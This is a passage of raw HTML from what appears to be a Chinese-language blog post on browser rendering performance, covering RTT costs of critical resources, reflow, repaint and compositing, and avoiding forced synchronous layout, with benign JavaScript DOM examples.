2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>请求关键资源</h4>\n<p>请求关键资源需要多少个 RTT（Round Trip Time），那什么是 RTT 呢？ 在之前中我们分析过，当使用 TCP 协议传输一个文件时，比如这个文件大小是 0.1M，由于 TCP 的特性，这个数据并不是一次传输到服务端的，而是需要拆分成一个个数据包来回多次进行传输的。RTT 就是这里的往返时延。它是网络中一个重要的性能指标，表示从发送端发送数据开始，到发送端收到来自接收端的确认，总共经历的时延。通常 1 个 HTTP 的数据包在 14KB 左右，所以 1 个 0.1M 的页面就需要拆分成 8 个包来传输了，也就是说需要 8 个 RTT</p>\n<p>我们可以结合上图来看看它的关键资源请求需要多少个 RTT。首先是请求 HTML 资源，大小是 6KB，小于 14KB，所以 1 个 RTT 就可以解决了。至于 JavaScript 和 CSS 文件，这里需要注意一点，由于渲染引擎有一个预解析的线程，在接收到 HTML 数据之后，预解析线程会快速扫描 HTML 数据中的关键资源，一旦扫描到了，会立马发起请求，你可以认为 JavaScript 和 CSS 是同时发起请求的，所以它们的请求是重叠的，那么计算它们的 RTT 时，只需要计算体积最大的那个数据就可以了。这里最大的是 CSS 文件（9KB），所以我们就按照 9KB 来计算，同样由于 9KB 小于 14KB，所以 JavaScript 和 CSS 资源也就可以算成 1 个 RTT。也就是说，上图中关键资源请求共花费了 2 个 RTT。</p>\n<p>了解了影响加载过程中的几个核心因素之后，接下来我们就可以系统性地考虑优化方案了。总的优化原则就是减少关键资源个数，降低关键资源大小，降低关键资源的 RTT 次数</p>\n<h3 id="解决方案"><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>解决方案</h3>\n<h4 id="如何减少关键资源的个数？"><a href="#%E5%A6%82%E4%BD%95%E5%87%8F%E5%B0%91%E5%85%B3%E9%94%AE%E8%B5%84%E6%BA%90%E7%9A%84%E4%B8%AA%E6%95%B0%EF%BC%9F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何减少关键资源的个数？</h4>\n<p>一种方式是可以将 JavaScript 和 CSS 改成内联的形式，比如上图的 JavaScript 和 CSS，若都改成内联模式，那么关键资源的个数就由 3 个减少到了 1 个。另一种方式，如果 JavaScript 代码没有 DOM 或者 CSSOM 的操作，则可以改成 async 或者 defer 属性；同样对于 CSS，如果不是在构建页面之前加载的，则可以添加媒体取消阻止显现的标志。当 JavaScript 标签加上了 async 或者 defer、CSSlink 属性之前加上了取消阻止显现的标志后，它们就变成了非关键资源了。</p>\n<h4 id="如何减少关键资源的大小？"><a href="#%E5%A6%82%E4%BD%95%E5%87%8F%E5%B0%91%E5%85%B3%E9%94%AE%E8%B5%84%E6%BA%90%E7%9A%84%E5%A4%A7%E5%B0%8F%EF%BC%9F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何减少关键资源的大小？</h4>\n<p>可以压缩 CSS 和 JavaScript 资源，移除 HTML、CSS、JavaScript 文件中一些注释内容，也可以通过前面讲的取消 CSS 或者 JavaScript 中关键资源的方式。</p>\n<h4 id="如何减少关键资源-rtt-的次数？"><a href="#%E5%A6%82%E4%BD%95%E5%87%8F%E5%B0%91%E5%85%B3%E9%94%AE%E8%B5%84%E6%BA%90-rtt-%E7%9A%84%E6%AC%A1%E6%95%B0%EF%BC%9F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何减少关键资源 RTT 的次数？</h4>\n<p>可以通过减少关键资源的个数和减少关键资源的大小搭配来实现。除此之外，还可以使用 CDN 来减少每次 RTT 时长。</p>\n<p>在优化实际的页面加载速度时，你可以先画出优化之前关键资源的图表，然后按照上面优化关键资源的原则去优化，优化完成之后再画出优化之后的关键资源图表。</p>\n<h2 id="交互阶段"><a href="#%E4%BA%A4%E4%BA%92%E9%98%B6%E6%AE%B5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>交互阶段</h2>\n<p>接下来我们再来聊聊页面加载完成之后的交互阶段以及应该如何去优化。谈交互阶段的优化，其实就是在谈渲染进程渲染帧的速度，因为在交互阶段，帧的渲染速度决定了交互的流畅度。因此讨论页面优化实际上就是讨论渲染引擎是如何渲染帧的，否则就无法优化帧率。</p>\n<p>我们先来看看交互阶段的渲染流水线（如下图）。和加载阶段的渲染流水线有一些不同的地方是，在交互阶段没有了加载关键资源和构建 DOM、CSSOM 流程，通常是由 JavaScript 触发交互动画的。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-09-22-31-4d3bbcdc4f4fe11835f7807d06189aac-b0aef.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 51.34370579915134%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABtUlEQVQoz3WS307bMBTG8367GKJdKapAXExFaOJiDzCkIXa3gYB2BSZBt3YXCCFtEpNW9Q12t12U0tI27QKxmyZO4r9JS8dxBNKG2Kefj+3Px85xZGM6nY4faqKb1g0Iuv8lGJTSIAyVFJHkKiGSYhwpn7gXzUa71eyb3TiSiX+PErESGGODcw6HUzVx6GTEbgAnjEd07IRjm6hrTyI/cvlU+9qMgWEQEz5xPc/gQqCrwdvaaOb91fzBIHtgpXeaqe3zuZKZ3etn98H5nSmZmVIvd+QsVILFT/582V898XvW0GBcsMDbrJMn2+azQjtV6M5sNZ6++zW7C+NOumimS/1UsTu70577gHIf/VyZZA7Ji2OiN0PZkdLltZC8xOoSy7bNNfh+imRnqFo2b1ohOLDUsoXpKMd1ddmeg49/hGvf6Jsa3fgOsCT+RY2tn3lrp9brr3j9zH31ZbhVdy3bMRjj1qC3W0dLZbzyGS9X0XIVIs5XUb6CdEycfMVe2jtfLPx8fthbKDZeVjqd/rURxzFLRP8BbiM0QgMzMPXfEfJuwAWlzPjzmODlQI4PIiQIAvjAo2m3tpT9oJxzZbcAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 09 22 31"\n        title=""\n        src="/static/2021-07-13-09-22-31-4d3bbcdc4f4fe11835f7807d06189aac-fee1c.png"\n        srcset="/static/2021-07-13-09-22-31-4d3bbcdc4f4fe11835f7807d06189aac-a67b7.png 200w,\n/static/2021-07-13-09-22-31-4d3bbcdc4f4fe11835f7807d06189aac-0b187.png 400w,\n/static/2021-07-13-09-22-31-4d3bbcdc4f4fe11835f7807d06189aac-fee1c.png 800w,\n/static/2021-07-13-09-22-31-4d3bbcdc4f4fe11835f7807d06189aac-b1a91.png 1200w,\n/static/2021-07-13-09-22-31-4d3bbcdc4f4fe11835f7807d06189aac-b0aef.png 1414w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>结合上图，我们来一起回顾下交互阶段是如何生成一个帧的。大部分情况下，生成一个新的帧都是由 JavaScript 通过修改 DOM 或者 CSSOM 来触发的。还有另外一部分帧是由 CSS 来触发的。</p>\n<p>如果在计算样式阶段发现有布局信息的修改，那么就会触发重排操作，然后触发后续渲染流水线的一系列操作，这个代价是非常大的。</p>\n<p>同样如果在计算样式阶段没有发现有布局信息的修改，只是修改了颜色一类的信息，那么就不会涉及到布局相关的调整，所以可以跳过布局阶段，直接进入绘制阶段，这个过程叫重绘。不过重绘阶段的代价也是不小的。</p>\n<p>还有另外一种情况，通过 CSS 实现一些变形、渐变、动画等特效，这是由 CSS 触发的，并且是在合成线程上执行的，这个过程称为合成。因为它不会触发重排或者重绘，而且合成操作本身的速度就非常快，所以执行合成是效率最高的方式。</p>\n<p>回顾了在交互过程中的帧是如何生成的，那接下来我们就可以讨论优化方案了。一个大的原则就是让单个帧的生成速度变快。所以，下面我们就来分析下在交互阶段渲染流水线中有哪些因素影响了帧的生成速度以及如何去优化</p>\n<h3 id="减少-javascript-脚本执行时间"><a href="#%E5%87%8F%E5%B0%91-javascript-%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%97%B6%E9%97%B4" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>减少 JavaScript 脚本执行时间</h3>\n<p>有时 JavaScript 函数的一次执行时间可能有几百毫秒，这就严重霸占了主线程执行其他渲染任务的时间。针对这种情况我们可以采用以下两种策略</p>\n<ul>\n<li>一种是将一次执行的函数分解为多个任务，使得每次的执行时间不要过久。</li>\n<li>另一种是采用 Web Workers。你可以把 Web Workers 当作主线程之外的一个线程，在 Web Workers 中是可以执行 JavaScript 脚本的，不过 Web Workers 中没有 DOM、CSSOM 环境，这意味着在 Web Workers 中是无法通过 JavaScript 来访问 DOM 的，所以我们可以把一些和 DOM 操作无关且耗时的任务放到 Web Workers 中去执行</li>\n</ul>\n<p>总之，在交互阶段，对 JavaScript 脚本总的原则就是不要一次霸占太久主线程。</p>\n<h3 id="避免强制同步布局"><a href="#%E9%81%BF%E5%85%8D%E5%BC%BA%E5%88%B6%E5%90%8C%E6%AD%A5%E5%B8%83%E5%B1%80" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>避免强制同步布局</h3>\n<p>在介绍强制同步布局之前，我们先来聊聊正常情况下的布局操作。通过 DOM 接口执行添加元素或者删除元素等操作后，是需要重新计算样式和布局的，不过正常情况下这些操作都是在另外的任务中异步完成的，这样做是为了避免当前的任务占用太长的主线程时间。为了直观理解，你可以参考下面的代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="56084057598315940000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<html>\n  <body>\n    <div id=&quot;mian_div&quot;>\n      <li id=&quot;time_li&quot;>time</li>\n      <li>geekbang</li>\n    </div>\n\n    <p id=&quot;demo&quot;>强制布局 demo</p>\n    <button onclick=&quot;foo()&quot;>添加新元素</button>\n\n    <script>\n      function foo() {\n        let main_div = document.getElementById(\'mian_div\');\n        let new_node = document.createElement(\'li\');\n        let textnode = document.createTextNode(\'time.geekbang\');\n        new_node.appendChild(textnode);\n        document.getElementById(\'mian_div\').appendChild(new_node);\n      }\n    </script>\n  </body>\n</html>`, `56084057598315940000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mian_div<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>time_li<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>time<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>geekbang<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>demo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>强制布局 demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>foo()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>添加新元素<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>\n\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n      <span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token keyword">let</span> main_div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'mian_div\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token keyword">let</span> new_node <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">\'li\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token keyword">let</span> textnode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token string">\'time.geekbang\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        new_node<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>textnode<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'mian_div\'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">;</span>\n      <span class="token punctuation">}</span>\n    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>对于上面这段代码，我们可以使用 Performance 工具来记录添加元素的过程，如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-09-25-18-cab02dee06966f47e2be4557132c0d35-b6993.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 32.763157894736835%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABIUlEQVQY032Qy07CQBSGeVB9AJ/DpTvXRiQGN27deIkkNhWjQRsaBKogqFCYMtPOnenMtLaNMZoQv/xnMmfxLc5fyyuyrEzBitl3ZD5iI3W5L7CdQLsgNt9E7ednK3nfSbeacrspvVkhZLvnbOeU7l3zzfLnWw+Go2geRLMAhS+tzrB+FZy0hoPRlGJ46aOLR3D7DJcAL0ECIgyiJFwkccxKeXx3OHk4HrhHfbfhO43ArQfOwap/Bsf3y9mkNyVtD7S70PHimyfk+onbha0O8l9pKWtJU0mVpJxiQmiMEAjnUnCbCq0EVTk3VXTO0u9QnUvz9+aqtkwppbVRaUooo4wxihkljGCt9X+FVa5dr9dSyuIVQnDOixEV2pii0N8p+AKzvYaV0+zbuAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 09 25 18"\n        title=""\n        src="/static/2021-07-13-09-25-18-cab02dee06966f47e2be4557132c0d35-fee1c.png"\n        srcset="/static/2021-07-13-09-25-18-cab02dee06966f47e2be4557132c0d35-a67b7.png 200w,\n/static/2021-07-13-09-25-18-cab02dee06966f47e2be4557132c0d35-0b187.png 400w,\n/static/2021-07-13-09-25-18-cab02dee06966f47e2be4557132c0d35-fee1c.png 800w,\n/static/2021-07-13-09-25-18-cab02dee06966f47e2be4557132c0d35-b1a91.png 1200w,\n/static/2021-07-13-09-25-18-cab02dee06966f47e2be4557132c0d35-b6993.png 1520w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从图中可以看出来，执行 JavaScript 添加元素是在一个任务中执行的，重新计算样式布局是在另外一个任务中执行，这就是正常情况下的布局操作。</p>\n<p>理解了正常情况下的布局操作，接下来我们就可以聊什么是强制同步布局了。</p>\n<p>所谓强制同步布局，是指 JavaScript 强制将计算样式和布局操作提前到当前的任务中。为了直观理解，这里我们对上面的代码做了一点修改，让它变成强制同步布局，修改后的代码如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="20889222028054032000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`function foo() {\n  let main_div = document.getElementById(\'mian_div\');\n  let new_node = document.createElement(\'li\');\n  let textnode = document.createTextNode(\'time.geekbang\');\n  new_node.appendChild(textnode);\n  document.getElementById(\'mian_div\').appendChild(new_node);\n  // 由于要获取到 offsetHeight，\n  // 但是此时的 offsetHeight 还是老的数据，\n  // 所以需要立即执行布局操作\n  console.log(main_div.offsetHeight);\n}`, `20889222028054032000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                js 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">let</span> main_div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'mian_div\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token keyword">let</span> new_node <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">\'li\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token keyword">let</span> textnode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span><span class="token string">\'time.geekbang\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  new_node<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>textnode<span class="token punctuation">)</span><span class="token punctuation">;</span>\n  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'mian_div\'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token comment">// 由于要获取到 offsetHeight，</span>\n  <span class="token comment">// 但是此时的 offsetHeight 还是老的数据，</span>\n  <span class="token comment">// 所以需要立即执行布局操作</span>\n  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>main_div<span class="token punctuation">.</span>offsetHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>将新的元素添加到 DOM 之后，我们又调用了 <code class="language-text">main_div.offsetHeight</code> 来获取新 <code class="language-text">main_div</code> 的高度信息。如果要获取到 <code class="language-text">main_div</code> 的高度，就需要重新布局，所以这里在获取到 <code class="language-text">main_div</code> 的高度之前，JavaScript 还需要强制让渲染引擎默认执行一次布局操作。我们把这个操作称为强制同步布局。</p>\n<p>同样，你可以看下面通过 Performance 记录的任务状态：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-09-26-01-6c4f4b8648e2991e73dafd1fb04c8e4b-57c91.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 43.45479082321187%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABO0lEQVQoz52PzU7CQBSF+5gmbvUhjFt9ATcmgjEu/Nm4UBZYIKARokBaLSYQ+VMEhtA2tQMtbenMXC9FBSMrb05Ozpx7v8VIfggBg0kAbvDt/izM5U0XeVH6IWMMAKRCcu8xt18vxtvlw1Y5jmqWYq1SrFlEn+c4PtvRKtoetGsF14vg7ssNaWR79Yz6cKkpKU1NPynpippBR2mzjJ5Cj4Jce7513BETyArJ5zAVgN4fjqpNXXegrNpJmdzlzcZrIGeG2bz7ZkDfhq4F3Q8gNn5NhBEtCcFRgA4cIPSm/EIZn9zTZMVJaJNazwPOhMDTZX2N9JNEVL5bbP3Y3jilm2d07cg+VzwsGV+F/oUHlG8nxruys3PtbF2N5aqPJV8mVsL/mF8w55wQ0ul0BoQYhm5ZlmmahmFQSlfCn9g/7n0rpEtxAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 09 26 01"\n        title=""\n        src="/static/2021-07-13-09-26-01-6c4f4b8648e2991e73dafd1fb04c8e4b-fee1c.png"\n        srcset="/static/2021-07-13-09-26-01-6c4f4b8648e2991e73dafd1fb04c8e4b-a67b7.png 200w,\n/static/2021-07-13-09-26-01-6c4f4b8648e2991e73dafd1fb04c8e4b-0b187.png 400w,\n/static/2021-07-13-09-26-01-6c4f4b8648e2991e73dafd1fb04c8e4b-fee1c.png 800w,\n/static/2021-07-13-09-26-01-6c4f4b8648e2991e73dafd1fb04c8e4b-b1a91.png 1200w,\n/static/2021-07-13-09-26-01-6c4f4b8648e2991e73dafd1fb04c8e4b-57c91.png 1482w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从上图可以看出来，计算样式和布局都是在当前脚本执行过程中触发的，这就是强制同步布局。</p>\n<p>为了避免强制同步布局，我们可以调整策略，在修改 DOM 之前查询相关值。代码如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="60204743183014920000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`function foo() {\n  let main_div = document.getElementById(\'mian_div\');\n  // 为了避免强制同步布局，在修改 DOM 之前查询相关值\n  console.log(main_div.offsetHeight);\n  let new_node = document.createElement(\'li\');\n  let textnode = document.createTextNode(\'time.geekbang\');\n  new_node.appendChild(textnode);\n  document.getElementById(\'mian_div\').appendChild(new_node);\n}`, `60204743183014920000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                js 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">let</span> main_div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'mian_div\'</span><span 